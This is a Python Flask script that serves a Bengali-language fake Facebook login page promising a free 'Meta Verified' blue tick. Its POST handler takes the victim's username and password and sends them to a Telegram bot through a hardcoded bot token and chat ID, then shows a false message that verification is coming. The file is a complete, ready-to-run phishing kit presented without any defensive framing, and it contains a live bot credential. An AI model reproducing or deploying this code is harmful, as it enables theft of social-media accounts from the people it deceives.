import requests
from flask import Flask, request

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8820038438:AAFI-8Ecx7fqBgfhIOilHyJ8V8ABi3ZqEJ4'
CHAT_ID = '6397893832'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # টেলিগ্রামে মেসেজ পাঠানো
        text_msg = f"🚨 নতুন মেটা ভেরিফাই তথ্য!\n\n👤 Username: {username}\n🔑 Password: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text_msg}"
        
        try:
            requests.get(url)
        except Exception as e:
            print("Error:", e)
            
        return "<h2 style='text-align:center; margin-top:50px; font-family:Arial; color:green;'>সফলভাবে আবেদন জমা হয়েছে! খুব শীঘ্রই আপনার অ্যাকাউন্টটি ব্লু টিক ভেরিফাই করা হবে।</h2>"

    return '''
        <!DOCTYPE html>
        <html lang="bn">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Meta Verified</title>
            <style>
                body {
                    background-color: #f0f2f5;
                    font-family: Helvetica, Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    text-align: center;
                    width: 396px;
                    padding: 20px;
                }
                .logo {
                    color: #1877f2;
                    font-size: 40px;
                    font-weight: bold;
                    margin-bottom: 10px;
                }
                .banner {
                    font-size: 16px;
                    color: #1c1e21;
                    background: #e7f3ff;
                    padding: 12px;
                    border-radius: 8px;
                    margin-bottom: 20px;
                    font-weight: bold;
                    border: 1px solid #b7d4fc;
                }
                .card {
                    background: #ffffff;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
                }
                input {
                    width: 100%;
                    padding: 14px;
                    margin-bottom: 12px;
                    border: 1px solid #ccd0d5;
                    border-radius: 6px;
                    font-size: 16px;
                    box-sizing: border-box;
                }
                .btn {
                    width: 100%;
                    background-color: #1877f2;
                    color: white;
                    border: none;
                    padding: 14px;
                    font-size: 20px;
                    font-weight: bold;
                    border-radius: 6px;
                    cursor: pointer;
                }
                .btn:hover {
                    background-color: #166fe5;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">facebook</div>
                <div class="banner">
                    ✨ ফ্রিতে মেটা ভেরিফাই ব্লু টিক মার্ক নিন!
                </div>
                <div class="card">
                    <form method="POST">
                        <input type="text" name="username" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা" required>
                        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
                        <button type="submit" class="btn">লগইন করুন</button>
                    </form>
                </div>
            </div>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
